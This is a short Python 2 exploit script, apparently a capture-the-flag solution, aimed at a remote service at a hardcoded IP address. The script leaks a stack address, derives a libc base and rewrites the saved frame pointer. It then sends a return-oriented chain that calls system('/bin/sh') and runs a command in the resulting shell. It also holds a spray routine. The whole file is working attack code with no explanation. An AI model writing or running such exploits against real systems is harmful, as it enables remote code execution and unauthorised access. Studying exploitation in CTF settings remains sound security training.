#!/usr/bin/env python2

from socket import *
import struct

def p64(n):
    return struct.pack('<Q', n)
def up64(s):
    return struct.unpack('<Q', s)[0]

#ADDR = ('localhost', 666)
ADDR = ('136.243.194.41', 666)
def send_string(msg):
    f.write(p64(len(msg)))
    f.write(msg)

def spray():
    for i in xrange(1024 * 1024):
        payload = "a" * 16 + p64(0x400480)[:-1]
        send_string(payload)
        print(f.readline())

if __name__ == '__main__':
	    s = create_connection(ADDR)
	    f = s.makefile(bufsize = 0)

	    # leak stack address
	    send_string("a"*9)
	    base = up64(("\x00" + f.readline().strip()[9:]).ljust(8, "\x00"))
	    print("BASE : %16X" % base)
	    #if (j == 0):
	    #    libc_base = base - 0x5e6000 + 0x1000 * i
	    #else:
	    #    libc_base = base - 0x5e6000 - 0x1000 * i
	    libc_base = base - 0x5EA000
	    print("DIFF : %16X" % (libc_base - base))

	    # change rbp
	    new_rbp = base - 0x800
	    payload = "a" * 8 + p64(new_rbp) + p64(0x4004D4)[:-1]
	    send_string(payload)
	    f.readline()

	    send_string(payload)
	    pop_rdi = libc_base + 0x13729E
	    system = libc_base + 0x443D0
	    bin_sh = libc_base + 0x18C3DD

	    payload = "a"*16 + p64(pop_rdi) + p64(bin_sh) + p64(system)
	    send_string(payload)
	    f.write("ps -aux;exit\n")

	    while True:
		r = f.readline()
		if not r: break
		print(r),
